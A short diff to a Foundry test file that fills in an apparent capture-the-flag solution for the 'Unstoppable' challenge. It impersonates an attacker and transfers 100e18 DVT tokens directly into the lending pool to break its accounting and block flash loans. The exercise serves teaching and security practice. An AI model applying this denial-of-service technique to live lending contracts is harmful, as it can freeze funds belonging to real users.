@@ -60,6 +60,16 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+
+        // Connect attacker address
+        vm.startPrank(attacker);
+
+        // Send tokens to vulnerable pool address
+        dvt.transfer(address(unstoppableLender), 100e18);
+        
+        // Stop attacker
+        vm.stopPrank();
+        
         /**
          * EXPLOIT END *
          */
